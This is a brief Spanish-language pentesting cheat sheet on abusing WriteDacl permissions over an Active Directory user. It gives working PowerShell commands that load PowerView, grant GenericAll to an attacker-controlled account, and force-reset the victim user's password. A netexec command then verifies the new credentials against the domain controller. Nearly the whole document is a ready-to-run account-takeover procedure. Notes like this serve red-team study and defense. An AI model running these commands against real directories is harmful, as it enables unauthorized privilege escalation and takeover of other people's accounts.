# Abuso ACL 

Tags: #AD #ACL #Windows 

## WriteDalc sobre Usuario 

```powershell
Paso 1:
# Cargar PowerView a la máquina víctima 
❯ Import-Module .\PowerView.ps1
```

```powershell
Paso 2:
# Agregar 'GenericAll' al usuario 'ControlledAccount' 
❯ Add-DomainObjectAcl -TargetIdentity TargetUser -Rights All -PrincipalIdentity ControlledAccount

	# TargetUser = Usuario víctima (Objetivo)
	# ControlledAccount = Usuario atacante (Controlas)
```

```powershell 
Paso 3:
# Crear la password para colocarla al usuario víctima 
❯ $cred = ConvertTo-Securestring 'P@$$w0rd123!' -AsPlainText -Force 

# Cambiar la contraseña al usuario víctima 
❯ Set-DomainUserPassword -Identity TargetUser -AccountPassword $cred 
```

```bash 
# Verificar el cambio de password 
❯ nxc smb IP_DC -u user -p 'P@$$w0rd123!' 
```